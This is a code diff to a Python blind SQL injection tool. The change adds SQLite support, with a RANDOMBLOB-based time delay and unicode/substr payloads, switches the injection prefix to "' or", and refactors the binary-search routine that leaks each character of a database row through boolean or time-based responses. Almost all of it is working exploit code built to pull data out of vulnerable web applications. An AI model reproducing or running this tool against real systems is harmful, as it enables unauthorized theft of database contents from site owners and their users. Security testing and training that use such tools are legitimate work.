@@ -4,9 +4,11 @@
 import re
 import sys
 import time
-import requests
 import urllib3
+import requests
+import datetime
 from enum import Enum
+
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -14,6 +16,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 class Database(Enum):
     MySQL = 1
     PostgreSQL = 2
+    SQLite = 3
 
 
 class SQLiType(Enum):
@@ -22,11 +25,12 @@ class SQLiType(Enum):
 
 
 ######### CHANGE THIS #########
-# database = Database.MySQL
-database = Database.PostgreSQL
+database = Database.MySQL
+# database = Database.PostgreSQL
+# database = Database.SQLite
 sqlitype = SQLiType.Boolean
 # sqlitype = SQLiType.Time
-PRE = "' AND"
+PRE = "' or"
 POST = '-- -'
 sleep_time = 2
 ###############################
@@ -36,10 +40,23 @@ if database == Database.PostgreSQL:
     SELECT_ROW = lambda row_num: f'limit 1 offset {row_num}'
     SUBSTRING = 'substring'
     ADD_SLEEP = lambda query: f'({query} AND 1=(select 1 from pg_sleep({sleep_time})))'
+    ASCII = 'ascii'
+    VERSION = 'version'
+    DBNAME ='PostgreSQL'
 elif database == Database.MySQL:
     SELECT_ROW = lambda row_num: f'limit {row_num},1'
     SUBSTRING = 'mid'
     ADD_SLEEP = lambda query: f'if({query},sleep({sleep_time}),0)'
+    ASCII = 'ascii'
+    VERSION = 'version'
+    DBNAME = 'MySQL'
+elif database == Database.SQLite:
+    SELECT_ROW = lambda row_num: f'limit {row_num-1},1'
+    SUBSTRING = 'substr'
+    ADD_SLEEP = lambda query: f'{query} and 1=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB({sleep_time}00000000/2))))'
+    ASCII = 'unicode'
+    VERSION = 'sqlite_version'
+    DBNAME = 'SQLite'
 else:
     exit('invalid database type')
 compare_value = None
@@ -198,10 +215,12 @@ def leak_query(query):
                 end = end_char
                 while start != end:
                     middle = (end + start) // 2
+                    # check if the ascii code of the character i in the row num_row is greater than midde
                     if multirow:
-                        payload = f"ascii({SUBSTRING}(({query} {SELECT_ROW(num_row)}), {i}, 1)) > {middle}"
+                        q = f'{query} {SELECT_ROW(num_row)}'
                     else:
-                        payload = f"ascii({SUBSTRING}(({query}), {i}, 1)) > {middle}"
+                        q = query
+                    payload = f"{ASCII}({SUBSTRING}(({q}), {i}, 1)) > {middle}"
                     if query_equals_true(payload):
                         start = middle + 1
                     else:
@@ -209,7 +228,8 @@ def leak_query(query):
                 leak += chr(start)
                 print(f'leaking row {num_row}: {leak}', end='\r')
             print(f'leaked row {num_row}: {leak} ')
-        leaks.append(leak)
+        if length > 0:
+            leaks.append(leak)
     except KeyboardInterrupt:
         print('')
     return leaks
@@ -217,13 +237,16 @@ def leak_query(query):
 
 def main():
     print('- -- Blind SQL injection script -- -\n')
+    t = 'Boolean' if sqlitype == SQLiType.Boolean else 'Time'
+    print(f'exploiting: {DBNAME}, {t} based')
 
-    # query = 'select table_name from information_schema.tables'
+    start = time.time()
+
     query = input('enter query: ')
     sys.stdout.buffer.write(b"\033[F")
     sys.stdout.buffer.write(b"\033[K")
     if query == '':
-        query = 'select substring(version(),1,10) as leak'
+        query = f'select {SUBSTRING}({VERSION}(),1,10) as leak'
         print('using demo query\n')
 
     # exploit!
@@ -234,11 +257,14 @@ def main():
             for i, entry in enumerate(leak):
                 f.write(f'row {i+1}: {entry}\n')
             f.write('\n')
-        print('[+] saved all entries in output.txt')
+        print('[+] saved all rows in output.txt')
     else:
         print('[!] no output!')
 
-    print(f'[i] completed after {num_queries} queries')
+    end = time.time()
+    run_time = str(datetime.timedelta(seconds=round(end-start)))
+
+    print(f'[i] completed after {num_queries} queries in {run_time}')
 
 
 if __name__ == '__main__':
